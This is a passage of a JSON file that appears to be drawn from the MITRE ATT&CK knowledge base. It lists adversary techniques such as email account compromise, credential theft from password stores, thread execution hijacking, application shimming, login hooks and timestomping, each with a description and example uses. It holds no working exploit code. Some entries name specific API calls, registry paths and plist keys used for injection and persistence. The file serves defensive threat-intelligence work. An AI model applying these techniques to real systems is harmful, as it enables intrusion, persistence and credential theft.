  "attack-pattern--3dc8c101-d4db-4f4d-8150-1b5a76ca5f1b": {
    "name": "Email Accounts",
    "example_uses": [
      "has used compromised email accounts to send credential phishing emails.",
      "has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information.",
      "has used compromised accounts to send spearphishing emails.",
      "has compromised email accounts to send spearphishing e-mails.",
      "has payed employees suppliers and business partners of target organizations for credentials.",
      "has compromised legitimate email accounts to use in their spearphishing operations.",
      "has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts.",
      "has compromised email accounts to conduct social engineering attacks.",
      "has sent thread hijacked messages from compromised emails.",
      "has used compromised email accounts to conduct spearphishing against contacts of the original victim.",
      "has compromised email accounts to send phishing emails."
    ],
    "description": "Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).A variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules.Adversaries can use a compromised email account to hijack existing email threads with targets of interest.",
    "similar_words": [
      "Email Accounts"
    ],
    "id": "T1586.002"
  },
  "attack-pattern--3ee16395-03f0-4690-a32e-69ce9ada0f9e": {
    "name": "Upload Malware",
    "example_uses": [
      "has uploaded malware to various platforms including Google Drive Pastetext Sharetext and GitHub.",
      "For   used compromised servers to host malware.",
      "During  threat actors uploaded commonly available hacker tools to compromised web servers.",
      "has staged malware and malicious files on compromised web servers GitHub and Google Drive.",
      "has hosted malicious payloads on DropBox including .",
      "has hosted malicious payloads on Dropbox.",
      "For   hosted malicious documents on domains registered by the group.",
      "has used Blogspot to host malicious content such as beacons file exfiltrators and implants.",
      "has hosted payloads on acquired second-stage servers for periods of either days weeks or months.",
      "has uploaded backdoored Docker images to Docker Hub.",
      "For  the threat actors staged malware and malicious files in legitimate hosting services such as OneDrive or MediaFire.",
      "has hosted open-source remote access Trojans used in its operations in GitHub.",
      "has registered domains to stage payloads.",
      "has hosted malicious payloads on Dropbox.",
      "has used compromised domains to host its malicious payloads.",
      "For  UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system.",
      "For  the threat actors staged malicious files on Dropbox and other websites.",
      "has staged malware on actor-controlled domains.",
      "has registered domains to stage payloads.",
      "For  the threat actors uploaded malware to websites under their control.",
      "has hosted malicious payloads in Dropbox Amazon S3 and Google Drive for use during targeting.",
      "has staged malware on fraudulent websites set up to impersonate targeted organizations.",
      "has staged legitimate software that was trojanized to contain an Atera agent installer on Amazon S3.",
      "has uploaded malicious payloads to file-sharing services including TransferNow TransferXL WeTransfer and OneDrive.",
      "staged compromised versions of legitimate software installers in forums to enable initial access to executing user.",
      "has used compromised and acquired infrastructure to host and deliver malware including Blogspot to host beacons file exfiltrators and implants.",
      "has uploaded malicious payloads to cloud storage sites.",
      "has used the Discord content delivery network for hosting malicious content referenced in links and emails.",
      "staged malicious capabilities online for follow-on download by victims or malware.",
      "staged malware on adversary-controlled domains and cloud storage instances during .",
      "has hosted malware on fake websites designed to target specific audiences.",
      "has staged tools such as  at public file sharing and hosting sites.",
      "has used its infrastructure for C2 and for staging the VINETHORN payload which masqueraded as a VPN application."
    ],
    "description": "Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.",
    "similar_words": [
      "Upload Malware"
    ],
    "id": "T1608.001"
  },
  "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a": {
    "name": "Steal or Forge Kerberos Tickets",
    "example_uses": [
      "have used scripts to dump Kerberos authentication credentials."
    ],
    "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as realms, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.On Windows, the built-in klist utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)",
    "similar_words": [
      "Steal or Forge Kerberos Tickets"
    ],
    "id": "T1558"
  },
  "attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0": {
    "name": "Credentials from Password Stores",
    "example_uses": [
      "has run `cmdkey` on victim machines to identify stored credentials.",
      "passw.plug plugin can gather account information from multiple instant messaging email and social media services as well as FTP VNC and VPN clients.",
      "performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways including from the credential vault and DPAPI.",
      "has stolen credentials from multiple applications and data sources including Windows OS credentials email clients FTP and SFTP clients.",
      "has attempted to obtain credentials from OpenSSH realvnc and PuTTY.",
      "used several tools for retrieving login and password information including LaZagne.",
      "is capable of stealing Outlook passwords.",
      "malware gathers passwords from multiple sources including Windows Credential Vault and Outlook.",
      "collects user credentials including passwords for various programs including popular instant messaging applications and email clients as well as WLAN keys.",
      "A module in  collects passwords stored in applications installed on the victim.",
      "has the ability to steal saved passwords from Microsoft Outlook.",
      "has used the Smartftp Password Decryptor tool to decrypt FTP passwords.",
      "can collect email credentials from victims.",
      "use Nirsoft Network Password Recovery or NetPass tools to steal stored RDP credentials in some malware versions.",
      "can retrieve passwords from messaging and mail client applications.",
      "has used a variety of publicly available tools like  to gather credentials.",
      "has performed credential dumping with  and other tools including by dumping passwords saved in victim email.",
      "can obtain passwords from common FTP clients.",
      "uses an external software known as NetPass to recover passwords.",
      "has the ability to steal credentials from FTP clients and wireless profiles.",
      "can obtain credentials from databases mail and WiFi across multiple platforms.",
      "collects credentials from several email clients.",
      "steals credentials from compromised hosts. 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  include ones associated with many sources such as The Bat! Yahoo! Mail.ru Passport.Net Google Talk and Microsoft Outlook.",
      "has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.",
      "has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP.",
      "During the   used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.",
      "has obtained credentials from mail clients via NirSoft MailPassView.",
      "has obtained credentials from mail clients via NirSoft MailPassView.",
      "can use Lazagne for harvesting credentials.",
      "can decrypt passwords stored in the RDCMan configuration file.",
      "can collect credentials from WINSCP.",
      "includes modules for stealing stored credentials from Outlook and Foxmail email client software.",
      "extracts credentials from the Windows Registry associated with Premiumsoft Navicat a utility used to facilitate access to various database types.",
      "has obtained information about accounts lists of employees and plaintext and hashed passwords from databases.",
      "can collect credentials stored in email clients."
    ],
    "description": "Adversaries may search for common password storage locations to obtain user credentials.(Citation: F-Secure The Dukes) Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
    "similar_words": [
      "Credentials from Password Stores"
    ],
    "id": "T1555"
  },
  "attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807": {
    "name": "Exfiltration Over Web Service",
    "example_uses": [
      "has used the Telegram API `sendMessage` to relay data on compromised devices.",
      "can exfiltrate data over Google Drive.",
      "has used legitimate web services to exfiltrate data.",
      "has exfiltrated files using web services.",
      "has been used by threat actors to configure servers for data exfiltration.",
      "During   used Cloudflare services for data exfiltration.",
      "During   exfiltrated data over public-facing webservers  such as Google Drive.",
      "can upload documents from compromised hosts to a shared Microsoft Office 365 Outlook email account for exfiltration.",
      "has used services such as `anonymfiles.com` and `file.io` to exfiltrate victim data.",
      "can use the Microsoft Office Exchange Web Services API to access an actor-controlled account and retrieve files for exfiltration.",
      "exfiltrates collected data to online file hosting sites such as `Mega.co.nz`."
    ],
    "description": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "similar_words": [
      "Exfiltration Over Web Service"
    ],
    "id": "T1567"
  },
  "attack-pattern--40f5caa0-4cb7-4117-89fc-d421bb493df3": {
    "name": "Domains",
    "example_uses": [
      "For  the threat actors registered domains for use in C2.",
      "registered domains imitating NATO OSCE security websites Caucasus information resources and other organizations.",
      "has registered domains to impersonate services such as Dropbox to distribute malware.",
      "For  the threat actors registered hundreds of domains using Duck DNS and DNS Exit.",
      "has registered and operated domains for campaigns often using a security or web technology theme or impersonating the targeted organization.",
      "has registered hundreds of domains for use in operations.",
      "During  threat actors registered domains for C2.",
      "has set up and operated websites to gather information and deliver malware.",
      "has established domains some of which were designed to look like official government domains for their operations.",
      "For  the threat actors established domains as part of their operational infrastructure.",
      "has established domains that impersonate legitimate entities to use for targeting efforts.",
      "During   registered a domain name identical to that of a compromised company as part of their BEC effort.",
      "has registered domains intended to look like legitimate target domains that have been used in watering hole attacks.",
      "has registered domains to spoof targeted organizations and trusted third parties.",
      "has registered domains for targeting intended victims.",
      "has registered domains often containing the keywords kimjoy h0pe and grace using domain registrars including Netdorm and No-IP DDNS and hosting providers including xTom GmbH and Danilenko Artyom.",
      "has used dynamic DNS providers to create legitimate-looking subdomains for C2.",
      "has registered domains to mimic file sharing government defense and research websites for use in targeted campaigns.",
      "has purchased domains for use in targeted campaigns.",
      "For   registered domains for use in C2 including some crafted to appear as existing legitimate domains.",
      "has registered domains for C2.",
      "command and control includes hard-coded domains in the malware chosen to masquerade as legitimate services such as Akamai CDN or Amazon Web Services.",
      "For  the threat actors re-registered expired C2 domains previously used for  malware.",
      "For  the threat actors established domains some of which appeared to spoof legitimate domains.",
      "have acquired C2 domains prior to operations.",
      "For  UNC3890 actors established domains that appeared to be legitimate services and entities such as LinkedIn Facebook Office 365 and Pfizer.",
      "has acquired domains related to their campaigns to act as distribution points and C2 channels.",
      "has registered domains to spoof targeted organizations by changing the top-level domain (TLD) to .us .co or .biz.",
      "has acquired domains to establish credential harvesting pages often spoofing the target organization and using free top level domains .TK .ML .GA .CF and .GQ.",
      "has registered look-alike domains for use in phishing campaigns.",
      "For   registered domains likely designed to appear relevant to student targets in India.",
      "For  the threat actors registered a variety of domains.",
      "has registered fraudulent domains such as mail-newyorker.com and news12.com.recover-session-service.site to target specific victims with phishing attacks.",
      "has registered multiple domains to facilitate payload staging and C2.",
      "has registered a variety of domains to host malicious payloads and for C2.",
      "has obtained domains to host their payloads.",
      "has registered domain names and created URLs that are often designed to mimic or spoof legitimate websites such as email login pages online file sharing and storage websites and password reset pages while also hosting these items on legitimate compromised network infrastructure.",
      "has registered domains for C2 that mimicked sites of their intended targets.",
      "has acquired domains imitating legitimate sites.",
      "For the   acquired C2 domains sometimes through resellers.",
      "has registered malicious domains for use in intrusion campaigns.",
      "has registered domains using randomized words and with names resembling legitimate organizations.",
      "has registered domains to spoof targeted organizations and trusted third parties including search engines web platforms and cryptocurrency exchanges.",
      "uses newly-registered domains containing only a few characters for command and controll purposes such as v0[.]cx.",
      "registered domains mimicking other entities throughout various campaigns.",
      "registered domains to develop effective personas for fake companies used in phishing activity.",
      "created domains to facilitate strategic website compromise and credential capture activities.",
      "has created domains for use with RMM tools.",
      "During   registered domains spoofing Indian critical infrastructure entities.",
      "has registered domains several of which masqueraded as news outlets and login services for use in operations.",
      "has registered domains spoofing Indian critical infrastructure entities.",
      "has set up fake VPN portals conference sign ups and job application websites to target victims.",
      "registered domains for authoritative name servers used in DNS hijacking activity and for command and control servers.",
      "has created fake domains to imitate legitimate venture capital or bank domains.",
      "can utilize hardcoded command and control domain configurations created by the XLoader authors. These are designed to mimic domain registrars and hosting service providers such as Hostinger and Namecheap.",
      "registered adversary-controlled domains during  that were re-registrations of expired domains."
    ],
    "description": "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique)Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)In addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actors choosing.(Citation: Invictus IR DangerDev 2024)",
    "similar_words": [
      "Domains"
    ],
    "id": "T1583.001"
  },
  "attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6": {
    "name": "Archive via Library",
    "example_uses": [
      "has the ability to use the open source libraries XZip/Xunzip and zlib to compress files.",
      "The  backdoor compresses communications using the standard Zlib compression library.",
      "can compress data with ZLIB prior to sending it back to the C2 server.",
      "can use zlib to compress and decompress data.",
      "compressed data with zlib prior to sending it over C2.",
      "compressed collected data using zlib.",
      "compresses the collected data with bzip2 before sending it to the C2 server.",
      "has compressed data using the aPLib compression library.",
      "applies compression to C2 traffic using the ZLIB library.",
      "scrambles and encrypts data using AES256 before sending it to the C2 server.",
      "malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib encrypted and uploaded to a C2 server.",
      "can invoke the `Common.Compress` method to compress data with the C# GZipStream compression class.",
      "has compressed collected files with zLib.",
      "has used RAR to compress encrypt and password-protect files prior to exfiltration.",
      "can zlib-compress data prior to exfiltration."
    ],
    "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
    "similar_words": [
      "Archive via Library"
    ],
    "id": "T1560.002"
  },
  "attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6": {
    "name": "Thread Execution Hijacking",
    "example_uses": [
      "can use thread injection to inject shellcode into the process of security software.",
      "performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.",
      "can inject a suspended thread of its own process into a new process and initiate via the ResumeThread API.",
      "can create a suspended instance of a legitimate process (e.g. ctfmon.exe) allocate memory within the suspended process corresponding to 's core module then redirect execution flow via `SetContextThread` API so that when the thread resumes the  core module is executed."
    ],
    "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.(Citation: Elastic Process Injection July 2017)This is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",
    "similar_words": [
      "Thread Execution Hijacking"
    ],
    "id": "T1055.003"
  },
  "attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83": {
    "name": "Application Shimming",
    "example_uses": [
      "has used a malicious shim database to maintain persistence.",
      "has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7 by creating a shim database to patch services.exe.",
      "has used application shim databases for persistence.",
      "has installed shim databases in the AppPatch folder."
    ],
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:* %WINDIR%\\AppPatch\\sysmain.sdb and* hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdbCustom databases are stored in:* %WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom and* hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\customTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
    "similar_words": [
      "Application Shimming"
    ],
    "id": "T1546.011"
  },
  "attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517": {
    "name": "Unsecured Credentials",
    "example_uses": [
      "uses NirSoft tools to steal user credentials from the infected machine. NirSoft tools are executed via process hollowing in a newly-created instance of vbc.exe or regasm.exe.",
      "can search for sensitive data: for example in Code Build environment variables EC2 user data and Cloud Formation templates.",
      "uses an external software known as NetPass to recover passwords.",
      "has obtained credentials insecurely stored on targeted network appliances.",
      "captures credentials by recording them through an alternative network listener registered to the mpnotify.exe process allowing for cleartext recording of logon information.",
      "gathered credentials hardcoded in binaries located on victim devices during ."
    ],
    "description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)),  or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).(Citation: Brining MimiKatz to Unix)",
    "similar_words": [
      "Unsecured Credentials"
    ],
    "id": "T1552"
  },
  "attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe": {
    "name": "Port Monitors",
    "example_uses": [],
    "description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in C:\\Windows\\System32 and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. The Registry key contains entries for the following:* Local Port* Standard TCP/IP Port* USB Monitor* WSD Port",
    "similar_words": [
      "Port Monitors"
    ],
    "id": "T1547.010"
  },
  "attack-pattern--438c967d-3996-4870-bfc2-3954752a1927": {
    "name": "Clear Mailbox Data",
    "example_uses": [
      "has the ability to delete emails used for C2 once the content has been copied.",
      "During the   removed evidence of email export requests using `Remove-MailboxExportRequest`.",
      "can set the `PR_DELETE_AFTER_SUBMIT` flag to delete messages sent for data exfiltration.",
      "has deleted login notification emails and has cleared the Sent folder to cover their tracks."
    ],
    "description": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the ExchangePowerShell [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including Remove-MailboxExportRequest to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called mail  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)",
    "similar_words": [
      "Clear Mailbox Data"
    ],
    "id": "T1070.008"
  },
  "attack-pattern--43ba2b05-cf72-4b6c-8243-03a4aba41ee0": {
    "name": "Login Hook",
    "example_uses": [],
    "description": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the /Library/Preferences/com.apple.loginwindow.plist file and can be modified using the defaults command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) Adversaries can add or insert a path to a malicious script in the com.apple.loginwindow.plist file, using the LoginHook or LogoutHook key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) ",
    "similar_words": [
      "Login Hook"
    ],
    "id": "T1037.002"
  },
  "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c": {
    "name": "Content Injection",
    "example_uses": [
      "has achieved initial access and execution through content injection into DNS HTTP and SMB replies to targeted hosts that redirect them to download malicious files.",
      "has injected content into DNS HTTP and SMB replies to redirect specifically-targeted victims to a fake Windows Update page to download malware."
    ],
    "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)Adversaries may inject content to victim systems in various ways, including:* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
    "similar_words": [
      "Content Injection"
    ],
    "id": "T1659"
  },
  "attack-pattern--43f2776f-b4bd-4118-94b8-fee47e69676d": {
    "name": "Exfiltration Over Webhook",
    "example_uses": [],
    "description": "Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.(Citation: RedHat Webhooks) Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks Repository Webhooks) Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.(Citation: Microsoft SQL Server)Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos Discord Webhook Abuse)(Citation: Checkmarx Webhooks)",
    "similar_words": [
      "Exfiltration Over Webhook"
    ],
    "id": "T1567.004"
  },
  "attack-pattern--45241b9e-9bbc-4826-a2cc-78855e51ca09": {
    "name": "Direct Cloud VM Connections",
    "example_uses": [],
    "description": "Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009), such as Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in the cloud), and AWS System Manager.(Citation: AWS System Manager).Methods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. Adversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console) These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)).",
    "similar_words": [
      "Direct Cloud VM Connections"
    ],
    "id": "T1021.008"
  },
  "attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611": {
    "name": "Timestomp",
    "example_uses": [
      "can change the timestamp of specified filenames.",
      "has performed timestomping on victim files.",
      "has the ability to use the Linux API function `utime` to change the timestamps of modified firmware update images.",
      "has modified file timestamps.",
      "For early  versions the compilation timestamp was faked.",
      "extracts and writes driver files that match the times of other legitimate files.",
      "modifies the time of a file as specified by the control server.",
      "can modify file or directory timestamps.",
      "has a command to timestop a file or directory.",
      "During  threat actors changed timestamps of multiple files on compromised Ivanti Secure Connect VPNs to conceal malicious activity.",
      "can modify the Creation Access and Write timestamps for malicious DLLs to match those of the genuine Windows DLL user32.dll.",
      "sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.",
      "can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.",
      "The  malware supports timestomping.",
